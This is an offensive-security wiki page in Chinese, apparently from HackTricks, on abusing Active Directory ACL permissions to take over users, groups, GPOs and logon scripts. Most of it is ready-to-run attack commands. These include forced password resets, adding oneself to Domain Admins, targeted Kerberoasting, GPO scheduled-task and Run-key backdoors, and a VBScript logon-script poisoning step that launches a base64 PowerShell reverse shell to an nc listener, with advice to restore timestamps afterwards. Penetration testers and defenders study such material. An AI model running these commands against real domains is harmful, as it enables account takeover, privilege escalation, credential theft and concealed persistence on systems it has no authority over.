# 滥用 Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**本页主要汇总了来自** [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **和** [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**的技术。更多细节请查阅原文。**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **用户上的 GenericAll 权限**

该权限授予攻击者对目标用户帐户的完全控制。一旦使用 `Get-ObjectAcl` 命令确认存在 `GenericAll` 权限，攻击者可以：

- **更改目标密码**：使用 `net user <username> <password> /domain`，攻击者可以重置该用户的密码。
- 在 Linux 上，也可以通过 SAMR 使用 Samba 的 `net rpc` 实现相同操作：
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **如果帐户被禁用，请清除 UAC 标志**: `GenericAll` 允许编辑 `userAccountControl`。从 Linux，BloodyAD 可以移除 `ACCOUNTDISABLE` 标志：
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: 将 SPN 分配给用户账户以使其成为 kerberoastable，然后使用 Rubeus 和 targetedKerberoast.py 提取并尝试破解 ticket-granting ticket (TGT) 哈希。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: 禁用该用户的预认证，使其账户易受 ASREPRoasting 攻击。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**：如果对某个用户拥有 `GenericAll` 权限，你可以添加基于证书的凭证并在不更改其密码的情况下以他们身份进行认证。参见：

{{#ref}}
shadow-credentials.md
{{#endref}}

## **组上的 GenericAll 权限**

如果攻击者对像 `Domain Admins` 这样的组拥有 `GenericAll` 权限，这个权限允许他们操纵组成员身份。在使用 `Get-NetGroup` 确定该组的识别名后，攻击者可以：

- **Add Themselves to the Domain Admins Group**：这可以通过直接命令完成，或使用诸如 Active Directory 或 PowerSploit 之类的模块。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- 从 Linux 你也可以利用 BloodyAD 将自己添加到任意组，当你对它们拥有 GenericAll/Write 成员权限时。如果目标组嵌套在 “Remote Management Users” 中，你将立即在遵守该组的主机上获得 WinRM 访问：
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

在计算机对象或用户帐户上拥有这些权限将允许：

- **Kerberos Resource-based Constrained Delegation**: 允许接管计算机对象。
- **Shadow Credentials**: 利用这些权限创建 Shadow Credentials，从而模拟计算机或用户帐户。

## **WriteProperty on Group**

如果用户对某个组的所有对象具有 `WriteProperty` 权限（例如 `Domain Admins`），他们可以：

- **将自己添加到 Domain Admins 组**: 可以通过组合 `net user` 和 `Add-NetGroupUser` 命令实现，此方法可在域内进行权限提升。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

该权限使攻击者能够通过直接操纵组成员关系的命令将自己添加到特定组中，例如 `Domain Admins`。使用以下命令序列可实现自我添加：
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

这是一种类似的权限；如果攻击者在这些组上拥有 `WriteProperty` 权限，则可以通过修改组属性直接将自己添加到组。对此权限的确认和执行如下：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

拥有针对用户的 `ExtendedRight`（`User-Force-Change-Password`）可在不知道当前密码的情况下重置密码。可以通过 PowerShell 或替代的命令行工具来验证此权限并利用它，提供多种重置用户密码的方法，包括交互式会话和适用于非交互环境的单行命令。相关命令从简单的 PowerShell 调用到在 Linux 上使用 `rpcclient` 不等，展示了攻击向量的多样性。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner 对组**

如果攻击者发现他们对某个组具有 `WriteOwner` 权限，他们可以将该组的所有权更改为自己。当目标组是 `Domain Admins` 时，这种操作尤其严重，因为更改所有者可以更广泛地控制组的属性和成员资格。该过程包括通过 `Get-ObjectAcl` 确认正确的对象，然后使用 `Set-DomainObjectOwner` 修改所有者，可通过 SID 或名称进行。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

此权限允许攻击者修改用户属性。具体来说，拥有 `GenericWrite` 访问权限的攻击者可以更改用户的登录脚本路径，以便在用户登录时执行恶意脚本。这是通过使用 `Set-ADObject` 命令更新目标用户的 `scriptpath` 属性，使其指向攻击者的脚本来实现的。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

拥有此权限的攻击者可以操控组成员资格，例如将自己或其他用户添加到特定组。该过程涉及创建一个 credential 对象，使用它向组中添加或移除用户，并使用 PowerShell 命令验证成员变更。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- 在 Linux 上，Samba `net` 可以在你对该组拥有 `GenericWrite` 权限时添加/移除成员（当 PowerShell/RSAT 无法使用时很有用）：
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

拥有 AD 对象并在其上具有 `WriteDACL` 权限，会使攻击者能够授予自己对该对象的 `GenericAll` 权限。这是通过 ADSI 操作实现的，从而允许对该对象进行完全控制并能够修改其组成员资格。尽管如此，使用 Active Directory 模块的 `Set-Acl` / `Get-Acl` cmdlets 来利用这些权限时仍然存在限制。
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner 快速接管 (PowerView)

当你对某个用户或服务账户拥有 `WriteOwner` 和 `WriteDacl` 权限时，你可以使用 PowerView 完全控制该账户并重设其密码，而无需知道旧密码：
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
注意：
- 如果你只有 `WriteOwner` 权限，可能需要先将所有者更改为自己：
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- 验证在密码重置后是否可以通过任何协议 (SMB/LDAP/RDP/WinRM) 访问。

## **域内复制 (DCSync)**

DCSync 攻击利用域上的特定复制权限来模拟 Domain Controller 并同步数据，包括用户凭据。这种强大的技术需要诸如 `DS-Replication-Get-Changes` 之类的权限，允许攻击者在无需直接访问 Domain Controller 的情况下从 AD 环境中提取敏感信息。[**在此了解有关 DCSync 攻击的更多信息。**](../dcsync.md)

## GPO 委派 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO 委派

被委派管理 Group Policy Objects (GPOs) 的访问权限可能带来重大安全风险。例如，如果像 `offense\spotless` 这样的用户被委派 GPO 管理权限，他们可能具有 **WriteProperty**、**WriteDacl** 和 **WriteOwner** 等权限。这些权限可以被滥用用于恶意目的，可通过 PowerView 识别：`bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### 枚举 GPO 权限

可以将 PowerSploit 的 cmdlets 链接在一起以识别配置错误的 GPO。这允许发现特定用户有权限管理的 GPO：`powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**应用了特定策略的计算机**：可以解析出特定 GPO 应用于哪些计算机，从而帮助了解潜在影响范围。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**应用于特定计算机的策略**：若要查看某台计算机应用了哪些策略，可使用诸如 `Get-DomainGPO` 的命令。

**应用了特定策略的 OUs**：可以使用 `Get-DomainOU` 来识别受某个策略影响的组织单元 (OUs)。

你也可以使用工具 [**GPOHound**](https://github.com/cogiceo/GPOHound) 来枚举 GPO 并查找其中的问题。

### 滥用 GPO - New-GPOImmediateTask

配置错误的 GPO 可以被利用来执行代码，例如通过创建一个 immediate scheduled task。可以通过此方式将用户添加到受影响机器的本地 administrators 组，从而显著提升权限：
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

如果安装了 GroupPolicy module，它允许创建和链接新的 GPOs，并设置首选项（例如 registry values）以在受影响的计算机上执行 backdoors。此方法要求 GPO 更新并且用户登录到计算机后才会执行：
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - 滥用 GPO

SharpGPOAbuse 提供了一种通过添加任务或修改设置来滥用现有 GPOs 的方法，而无需创建新的 GPOs。该工具在应用更改之前需要修改现有 GPOs 或使用 RSAT 工具创建新的 GPOs：
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制策略更新

GPO 更新通常每约 90 分钟发生一次。为加快此过程，尤其在实施更改后，可在目标计算机上使用 `gpupdate /force` 命令以强制立即更新策略。此命令确保对 GPOs 的任何修改在无需等待下一个自动更新周期的情况下被应用。

### 深入解析

检查给定 GPO（例如 `Misconfigured Policy`）的 Scheduled Tasks 时，可以确认添加了诸如 `evilTask` 的任务。这些任务通常通过脚本或命令行工具创建，目的是修改系统行为或提升权限。

由 `New-GPOImmediateTask` 生成的 XML 配置文件中显示的任务结构，概述了计划任务的具体细节——包括要执行的命令及其触发器。该文件反映了在 GPO 中定义和管理计划任务的方式，提供了一种在策略执行过程中运行任意命令或脚本的方法。

### Users and Groups

GPO 还允许操控目标系统上的用户和组成员资格。通过直接编辑 Users and Groups 策略文件，攻击者可以将用户添加到特权组，例如本地的 `administrators` 组。这是通过委派 GPO 管理权限实现的，委派权限允许修改策略文件以包含新用户或更改组成员资格。

Users and Groups 的 XML 配置文件阐明了这些更改如何实现。向该文件添加条目即可在受影响的系统上为特定用户授予提升的权限。该方法通过操作 GPO 提供了一条直接的权限提升途径。

此外，还可以考虑其他执行 code 或保持持久化的方法，例如利用 logon/logoff scripts、修改用于 autoruns 的注册表键、通过 .msi 文件安装软件，或编辑服务配置等。这些技术为滥用 GPOs 来维持访问和控制目标系统提供了多种途径。

## SYSVOL/NETLOGON Logon Script Poisoning

可写路径下的 `\\<dc>\SYSVOL\<domain>\scripts\` 或 `\\<dc>\NETLOGON\` 允许篡改通过 GPO 在用户登录时执行的 logon scripts。这会导致在登录用户的安全上下文中执行 code。

### 定位 logon scripts
- 检查用户属性以查看是否配置了 logon script：
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- 爬取域共享以揭示快捷方式或指向脚本的引用：
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- 解析 `.lnk` 文件以识别指向 SYSVOL/NETLOGON 的目标（对 DFIR 很有用的技巧，也适用于没有直接 GPO 访问权限的攻击者）：
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound 会在用户节点存在时显示 `logonScript`（scriptPath）属性。

### 验证写入访问（不要相信共享列表）
自动化工具可能会显示 SYSVOL/NETLOGON 为只读，但底层的 NTFS ACLs 仍可能允许写入。务必进行测试：
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
如果文件大小或 mtime 改变，说明你有写权限。修改前请保留原始文件。

### Poison a VBScript logon script for RCE
追加一条命令以启动 PowerShell reverse shell（从 revshells.com 生成），并保留原有逻辑以避免破坏业务功能：
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
在你的主机上监听并等待下一个交互式登录：
```bash
rlwrap -cAr nc -lnvp 443
```
注意：
- Execution happens under the logging user’s token (not SYSTEM). Scope is the GPO link (OU, site, domain) applying that script.
- 使用后通过恢复原始内容/时间戳进行清理。


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
